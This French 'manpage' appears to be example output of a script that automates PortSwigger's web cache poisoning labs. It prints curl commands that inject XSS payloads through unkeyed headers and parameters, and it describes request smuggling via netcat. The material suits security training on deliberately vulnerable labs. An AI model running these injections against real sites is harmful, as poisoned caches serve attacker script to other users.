# MANPAGE

Voici un **exemple exhaustif d’exécution du script** pour tous les challenges Web Cache Poisoning de PortSwigger, avec payloads variables, en suivant la méthodologie automatisée :  
Chaque étape montre l’analyse (essai de vecteurs et payloads), l’attaque (injection réelle), le contrôle (vérification du cache), et s’arrête dès qu’un payload fonctionne, pour chaque challenge officiel.

---

## Paramètres du script (exemple)

```bash
LAB_URL="https://0ab100be03a1d2e280d7308a00d0000c.web-security-academy.net"
EXPLOIT_SERVER="exploit-server.net"
COOKIE="session=GXqGg2p9TkqLpZvR8nMjH4aR1s1d"
HEADERS="-H 'Cookie: $COOKIE'"
PAYLOADS=(
    "poisoned-by-cache"
    "<script>alert(1)</script>"
    "xss-test"
)
```

---

## Challenge 1 : Web Cache Poisoning (basic)

```
[1] Web Cache Poisoning (basic)
Test: curl -s -H "X-Forwarded-Host: poisoned-by-cache" -H 'Cookie: session=GXqGg2p9TkqLpZvR8nMjH4aR1s1d' "https://0ab100be03a1d2e280d7308a00d0000c.web-security-academy.net/?cb=poisoned-by-cache"
Payload 'poisoned-by-cache' détecté dans la réponse via X-Forwarded-Host et cb.
Empoisonnement du cache...
Contrôle :
=> Empoisonnement du cache confirmé avec payload 'poisoned-by-cache' !
```

- **Analyse** : Test de tous les headers (`X-Forwarded-Host`, etc.) et paramètres (`cb`, etc.) avec chaque payload.
- **Attaque** : Injection du payload dans la réponse.
- **Contrôle** : Nouvelle requête sans header : le payload est visible (preuve d’empoisonnement).

---

## Challenge 2 : Web Cache Poisoning with multiple headers

```
[2] Web Cache Poisoning with multiple headers
Test: curl -s -H "X-Forwarded-Host: <script>alert(1)</script>" -H "X-Original-URL: <script>alert(1)</script>" -H 'Cookie: session=GXqGg2p9TkqLpZvR8nMjH4aR1s1d' "https://0ab100be03a1d2e280d7308a00d0000c.web-security-academy.net/?cb=<script>alert(1)</script>"
Payload '<script>alert(1)</script>' détecté dans la réponse via X-Forwarded-Host + X-Original-URL et cb.
Empoisonnement du cache...
Contrôle :
=> Empoisonnement multi-header confirmé avec payload '<script>alert(1)</script>' !
```

- **Analyse** : Test de toutes les combinaisons de headers et paramètres avec tous les payloads.
- **Attaque** : Injection simultanée de plusieurs headers.
- **Contrôle** : Nouvelle requête sans headers, le payload est visible (preuve d’empoisonnement).

---

## Challenge 3 : Web Cache Poisoning via Request Smuggling

```
[3] Web Cache Poisoning via Request Smuggling
Envoi de la requête smuggling avec payload 'xss-test' via netcat :
Contrôle :
=> Empoisonnement via smuggling confirmé avec payload 'xss-test' !
```

- **Analyse** : Construction d’une requête HTTP smuggled (avec `Transfer-Encoding: chunked`), en utilisant chaque payload.
- **Attaque** : Envoi de la requête smuggled contenant le payload dans un header.
- **Contrôle** : Nouvelle requête standard : le payload injecté via smuggling est visible dans la réponse.

---

## Challenge 4 : Web Cache Poisoning via unkeyed parameter

```
[4] Web Cache Poisoning via unkeyed parameter
Test: curl -s -H 'Cookie: session=GXqGg2p9TkqLpZvR8nMjH4aR1s1d' "https://0ab100be03a1d2e280d7308a00d0000c.web-security-academy.net/?utm_content=<script>alert(1)</script>"
Payload '<script>alert(1)</script>' détecté dans la réponse via utm_content.
Empoisonnement du cache...
Contrôle :
=> Empoisonnement confirmé via utm_content avec payload '<script>alert(1)</script>' !
```

- **Analyse** : Injection du payload dans chaque paramètre non pris en compte dans la clé de cache, pour chaque payload.
- **Attaque** : Envoi de la requête avec le paramètre.
- **Contrôle** : Nouvelle requête sans le paramètre, le payload est visible (preuve d’empoisonnement).

---

## Résumé de l’exécution

| Challenge                                 | Vecteur testé                        | Payload injecté           | Contrôle (succès)                 |
|--------------------------------------------|--------------------------------------|---------------------------|-----------------------------------|
| Basic                                     | X-Forwarded-Host + cb                | poisoned-by-cache         | Payload visible                   |
| Multiple headers                          | X-Forwarded-Host + X-Original-URL    | <script>alert(1)</script> | Payload visible                   |
| Request smuggling                         | Smuggled header via netcat           | xss-test                  | Payload visible                   |
| Unkeyed parameter                         | utm_content                          | <script>alert(1)</script> | Payload visible                   |

---

## Points méthodologiques

- **Analyse** : Le script tente chaque payload sur chaque vecteur (headers, params, smuggling) jusqu’à trouver un qui injecte le payload dans la réponse.
- **Attaque** : Le vecteur fonctionnel est utilisé pour empoisonner le cache.
- **Contrôle** : Nouvelle requête sans header/paramètre : si le payload est visible, l’attaque est réussie.
- **Récursivité** : Si un vecteur/payload échoue, le script passe au suivant jusqu’à succès ou épuisement.

---

